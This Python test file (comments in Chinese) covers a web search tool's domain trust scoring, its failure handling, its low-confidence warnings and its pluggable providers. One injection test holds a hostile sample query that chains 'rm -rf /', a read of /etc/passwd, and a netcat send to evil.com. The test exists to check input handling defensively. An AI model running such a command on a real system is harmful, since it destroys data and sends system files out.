"""测试 deadman.tools.web_search - Web 搜索工具

覆盖点（9 个）：
  1. test_classify_gov_cn: .gov.cn 域名 → ("official", 0.9)
  2. test_classify_gov: .gov 域名 → ("official", 0.9)
  3. test_classify_edu: .edu.cn 域名 → ("official", 0.85)
  4. test_classify_news: 已知新闻域名 → ("news", 0.7)
  5. test_classify_unknown: 其他域名 → ("unknown", 0.4)
  6. test_search_returns_empty_on_failure: httpx 异常时返回空列表（integrity-framework）
  7. test_search_no_injection: shell 元字符仅作为 URL params（input-guardrails）
  8. test_search_low_confidence_note: 全部低可信度时 note 含"需向官方核实"（retrieval-guardrails）
  9. test_search_provider_protocol: 自定义 provider 可插拔

不依赖 pytest-asyncio：async 方法用 asyncio.run() 在 sync 测试函数内调用。
"""

from __future__ import annotations

import asyncio
from typing import Any
from unittest.mock import AsyncMock, MagicMock

import pytest

from deadman.tools.web_search import (
    DuckDuckGoSearchProvider,
    SearchResult,
    WebSearchProvider,
    WebSearchTool,
)


# =====================================================================
# 1-5. _classify 单元测试（retrieval-guardrails 信任等级）
# =====================================================================


class TestClassify:
    """测试 DuckDuckGoSearchProvider._classify 的域名分类逻辑"""

    def setup_method(self):
        self.provider = DuckDuckGoSearchProvider()

    def test_classify_gov_cn(self):
        # .gov.cn 域名 → official, 0.9
        source_type, confidence = self.provider._classify(
            "https://www.gov.cn/zhengce/content/2024.htm", "国务院政策"
        )
        assert source_type == "official"
        assert confidence == 0.9

    def test_classify_gov(self):
        # .gov / .gov.uk / .gov.au 域名 → official, 0.9
        source_type, confidence = self.provider._classify(
            "https://www.service.gov.uk/example", "UK government service"
        )
        assert source_type == "official"
        assert confidence == 0.9

    def test_classify_edu(self):
        # .edu.cn 域名 → official, 0.85
        source_type, confidence = self.provider._classify(
            "https://www.tsinghua.edu.cn/news.htm", "清华大学新闻"
        )
        assert source_type == "official"
        assert confidence == 0.85

    def test_classify_news(self):
        # 已知新闻域名 → news, 0.7
        source_type, confidence = self.provider._classify(
            "https://www.people.com.cn/n1/2024/test.html", "人民日报报道"
        )
        assert source_type == "news"
        assert confidence == 0.7

    def test_classify_unknown(self):
        # 其他域名 → unknown, 0.4
        source_type, confidence = self.provider._classify(
            "https://www.random-example-site.xyz/page", "随机内容"
        )
        assert source_type == "unknown"
        assert confidence == 0.4


# =====================================================================
# 6. 失败返回空列表（integrity-framework：不编造结果）
# =====================================================================


class TestSearchFailure:
    """测试搜索失败时的行为 - 必须返回空列表，不抛异常，不编造"""

    def test_search_returns_empty_on_failure(self):
        # mock httpx client 抛异常，验证 search() 返回空列表
        mock_client = MagicMock()
        # client.get 抛 ConnectError（模拟无网络）
        mock_client.get = AsyncMock(side_effect=Exception("ConnectError: network unreachable"))

        provider = DuckDuckGoSearchProvider(http_client=mock_client)

        # 执行搜索（不应抛异常）
        results = asyncio.run(provider.search("test query", max_results=3))

        # 应返回空列表（integrity-framework：不编造）
        assert isinstance(results, list)
        assert len(results) == 0

        # 验证 mock_client.get 被调用（query 作为 params 传入，不拼接到 URL）
        mock_client.get.assert_called_once()
        call_args = mock_client.get.call_args
        # params 应包含 query（作为 URL 参数，不是 URL 拼接）
        assert call_args.kwargs.get("params", {}).get("q") == "test query"


# =====================================================================
# 7. 防注入：shell 元字符仅作为 URL params（input-guardrails）
# =====================================================================


class TestNoInjection:
    """测试 query 仅作为 URL params 传入，不拼接到 shell"""

    def test_search_no_injection(self):
        # 构造含 shell 元字符的恶意 query
        evil_query = "test; rm -rf /; $(cat /etc/passwd) | nc evil.com 1337"

        mock_client = MagicMock()
        mock_client.get = AsyncMock(
            side_effect=Exception("forced failure to inspect call args")
        )

        provider = DuckDuckGoSearchProvider(http_client=mock_client)
        # 执行搜索（会失败，但我们关注的是调用参数）
        asyncio.run(provider.search(evil_query, max_results=3))

        # 验证 query 作为 params["q"] 传入，不拼接到 URL
        mock_client.get.assert_called_once()
        call_args = mock_client.get.call_args
        # URL 应是固定的 _SEARCH_URL，不含 evil_query
        url_arg = call_args.args[0] if call_args.args else call_args.kwargs.get("url")
        assert url_arg == "https://html.duckduckgo.com/html/"
        # query 应原样作为 params 传入（httpx 负责编码）
        params = call_args.kwargs.get("params", {})
        assert params.get("q") == evil_query
        # URL 中不应直接出现 evil_query 的危险部分
        assert "rm -rf" not in url_arg
        assert "$(cat" not in url_arg


# =====================================================================
# 8. 低可信度结果 note 含"需向官方核实"（retrieval-guardrails）
# =====================================================================


class TestLowConfidenceNote:
    """测试 confidence<0.5 的结果在 note 中标注'需向官方核实'"""

    def test_search_low_confidence_note(self):
        # 构造自定义 provider，返回全部低可信度结果（confidence=0.4 < 0.5）
        class LowConfidenceProvider:
            name = "test_low_conf"

            async def search(self, query: str, max_results: int = 5) -> list[SearchResult]:
                return [
                    SearchResult(
                        title="随机博客内容",
                        url="https://random-blog.xyz/post",
                        snippet="未经验证的信息",
                        source_type="blog",
                        confidence=0.4,  # 低于 0.5 阈值
                    )
                ]

        tool = WebSearchTool(provider=LowConfidenceProvider())  # type: ignore[arg-type]
        result = asyncio.run(tool.search("test query", max_results=5))

        assert result["ok"] is True
        assert result["low_confidence_count"] == 1
        # note 应包含"需向官方核实"（retrieval-guardrails 要求）
        assert "需向官方核实" in result["note"], (
            f"note 应含'需向官方核实'，实际: {result['note']}"
        )


# =====================================================================
# 9. Provider Protocol 可插拔性
# =====================================================================


class TestProviderProtocol:
    """测试 WebSearchProvider Protocol 允许自定义 provider 插拔"""

    def test_search_provider_protocol(self):
        # 自定义 provider 实现 WebSearchProvider Protocol
        class CustomProvider:
            name = "custom_test"

            async def search(self, query: str, max_results: int = 5) -> list[SearchResult]:
                return [
                    SearchResult(
                        title=f"自定义结果 for {query}",
                        url="https://custom.example.gov.cn/page",
                        snippet="自定义 provider 返回",
                        source_type="official",
                        confidence=0.9,
                    )
                ]

        custom = CustomProvider()
        # 验证 CustomProvider 满足 WebSearchProvider Protocol（结构子类型）
        # Python Protocol 是结构化的，不强制 isinstance
        tool = WebSearchTool(provider=custom)  # type: ignore[arg-type]

        result = asyncio.run(tool.search("custom query", max_results=3))

        assert result["ok"] is True
        assert result["provider"] == "custom_test"
        assert len(result["results"]) == 1
        assert result["results"][0]["title"] == "自定义结果 for custom query"
        assert result["results"][0]["source_type"] == "official"
        assert result["results"][0]["confidence"] == 0.9
        # 自定义 provider 的官方源结果不应被标低可信度
        assert result["low_confidence_count"] == 0
